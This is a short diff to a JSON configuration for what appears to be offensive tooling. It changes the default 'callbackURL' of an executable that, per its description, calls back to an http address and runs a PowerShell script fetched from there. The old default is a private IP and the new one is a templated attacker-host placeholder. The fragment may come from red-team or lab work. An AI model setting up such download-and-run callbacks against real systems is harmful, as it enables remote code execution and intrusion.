@@ -9,7 +9,7 @@
         {
             "name": "callbackURL",
             "description": "Executable will call back and run the PowerShell script at this http address.",
-            "defaultValue": "http://192.168.45.208/runme.txt"
+            "defaultValue": "http://[[[[ownIP]]]]/misc/run.txt"
         },
         {
             "name": "compile",
